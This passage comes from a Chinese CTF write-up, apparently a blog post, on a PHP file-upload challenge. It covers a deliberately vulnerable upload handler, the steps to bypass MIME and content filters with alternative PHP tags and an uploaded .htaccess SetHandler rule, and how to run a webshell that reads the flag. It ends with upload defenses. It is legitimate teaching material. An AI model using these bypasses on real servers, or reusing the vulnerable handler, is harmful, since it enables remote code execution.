// 第三层：内容里的 <?php 标记
$content = file_get_contents($file['tmp_name']);
if (preg_match('/<\?php/i', $content)) {
    die('诶，别蒙我啊，这标志明显还是php啊');
}

// 按会话生成上传目录
$dir = __DIR__ . '/upload/' . session_id();
if (!is_dir($dir)) {
    mkdir($dir, 0777, true);
}

$target = $dir . '/' . $name;
if (!move_uploaded_file($file['tmp_name'], $target)) {
    die('move failed');
}

echo '/upload/' . session_id() . '/' . $name . ' succesfully uploaded!';
```

**4. 启动**

```bash
docker build -t babyupload .
docker run --rm -p 8080:80 babyupload
```

**5. 跑脚本**

把脚本里的 `BASE` 改成 `http://127.0.0.1:8080`，运行后应该输出：

```text
CTF2{local_babyupload_demo}
```

本地的关键配置是：

| 配置 | 作用 |
| --- | --- |
| `AllowOverride All` | 让 `.htaccess` 生效 |
| `php:5.6-apache` | 支持 `<script language="php">` |
| `chmod 777 upload` | 让 `www-data` 能写目录 |
| `/flag` | 模拟文件系统根目录的 flag |

{% note info %}
**拉不到 PHP 5.6 镜像怎么办？**

可以换 `php:7.4-apache`，但 `<script language="php">` 在 PHP 7 已被移除。替代方案：

- 木马改用 `<? ... ?>`；
- 在 `.htaccess` 里加 `php_value short_open_tag 1`；
- 确认 `AllowOverride` 允许 `php_value`（通常需要 `All`）。

或者只在本机已有的 Apache + PHP 环境里验证 `.htaccess` 规则，不追求和靶场完全一致。
{% endnote %}

## 完整流程速查

| 步骤 | 目的 | 操作 / payload | 结果 |
| --- | --- | --- | --- |
| 1 | 找上传点 | 看页面、抓包 | 字段名 `uploaded` |
| 2 | 试 MIME | 直接传 `.png` | “上传类型也太露骨了吧！” |
| 3 | 绕 MIME | Burp 改 `Content-Type: image/jpeg` | 文件落盘 |
| 4 | 试内容 | 内容写 `<?php ... ?>` | “这标志明显还是php啊” |
| 5 | 绕内容 | 换 `<script language="php">...</script>` | 上传成功 |
| 6 | 确认不执行 | 访问 `.png` | 源码 / 空白 / 下载 |
| 7 | 找服务器 | 访问不存在的 `/flag` | 404 页脚显示 Apache |
| 8 | 传 `.htaccess` | `SetHandler application/x-httpd-php` | 上传成功 |
| 9 | 同目录 | 同一 `Session` 传木马 | 两个路径同目录 |
| 10 | 执行 | 访问 `.png` | 输出 flag |

## 顺手聊聊怎么防

这道题的防线几乎每一层都建在了“错误的地方”：检查 MIME 却信任客户端，拦后缀却放过 `.htaccess`，拦 `<?php` 却不拦等价标签。真正靠谱的做法是：

| 优先级 | 措施 | 说明 |
| --- | --- | --- |
| ★★★ | **上传目录禁止执行脚本** | `php_admin_flag engine off`、`RemoveHandler`、`Options -ExecCGI`，最根本 |
| ★★★ | **文件存到 Web 根目录之外** | 通过下载接口读取，不直接暴露路径 |
| ★★★ | **白名单后缀 + 服务端真实类型校验** | `finfo_file()` / `getimagesize()`，不信任 `$_FILES['type']` |
| ★★☆ | **重命名文件、去除可执行后缀** | 随机名 + 固定安全后缀，别保留用户文件名 |
| ★★☆ | **`AllowOverride None`** | 禁止用户上传的 `.htaccess` 生效 |
| ★★☆ | **最小权限运行** | Web 用户读不到 `/flag` 这类敏感文件 |
| ★☆☆ | **内容黑名单 / WAF** | 只能提高门槛，等价标签、编码、拼接都能绕 |

最关键的一条是：**不要试图“过滤掉所有坏内容”，而是让上传目录里的文件根本没有机会被当成代码执行。** 只要执行权限关死，传什么上去都只是文件。

{% note success %}
**一条原则**：文件上传的终点不是“上传成功”，而是“服务端按我的预期解析了这个文件”。防守方也一样——只要上传目录不执行脚本，攻击者传再多花样的文件也只是占磁盘。
{% endnote %}

## 小结

这道题是一条很完整的文件上传链：

- **MIME 检查**：只认 `image/jpeg`，但 `Content-Type` 是客户端可控的，Burp 一改就过；
- **后缀黑名单**：拦了 `ph` 系列，但 `.png` 能过；而 `.png` 默认不执行，所以光过后缀没用；
- **内容黑名单**：拦 `<?php`，但 `<script language="php">` 和 `<?` 都是等价写法；
- **解析接管**：404 页面暴露 Apache，`.htaccess` 的 `SetHandler` 把整个目录交给 PHP，`.png` 也能执行；
- **同目录 + 同会话**：`.htaccess` 只对所在目录生效，上传目录又和会话绑定，所以两次上传必须共用一个 `Session`；
- **竞态**：3 秒清理逼着脚本“上传完立刻访问”，随机文件名和 `?t=` 用来避开缓存与旧文件。

最后留一条经验：**文件上传题先问“它检查了什么”，再问“它怎么解析”。** 前者决定你能不能传上去，后者决定你传上去有没有用。只盯着后缀，很容易在第四层卡死。
